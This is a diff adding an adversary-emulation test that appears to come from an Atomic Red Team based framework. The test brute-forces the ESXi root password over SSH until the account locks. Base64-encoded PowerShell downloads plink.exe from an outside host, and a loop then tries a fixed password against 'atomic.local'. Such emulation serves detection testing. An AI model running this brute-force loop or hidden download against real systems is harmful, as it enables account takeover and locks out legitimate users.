@@ -1,0 +1,21 @@
+- id: 9d4cb914-1875-5ea3-ad1e-22165cc77974
+  name: Soumaia ART Tests - ESXi - Brute Force Until Account Lockout
+  description: 'An adversary may attempt to brute force the password of privilleged account for privilege escalation.
+
+    In the process, the TA may lock the account, which can be used for detection. [Reference](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/#:~:text=A%20ransomware%20group%20attacking%20large,internal%20systems%20after%20establishing%20a)'
+  tactic: credential-access
+  technique:
+    attack_id: T1110.001
+    name: 'Brute Force: Password Guessing'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABwAGwAaQBuAGsALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AdABoAGUALgBlAGEAcgB0AGgALgBsAGkALwB+AHMAZwB0AGEAdABoAGEAbQAvAHAAdQB0AHQAeQAvAGwAYQB0AGUAcwB0AC8AdwA2ADQALwBwAGwAaQBuAGsALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAHAAbABpAG4AawAuAGUAeABlACIACgA=
+          }
+          $lockout_threshold = [int]"5"
+          for ($var = 1; $var -le $lockout_threshold; $var++) {
+            $env:TEMP\ART-ExternalPayloads\plink.exe -ssh "atomic.local" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002
+            }
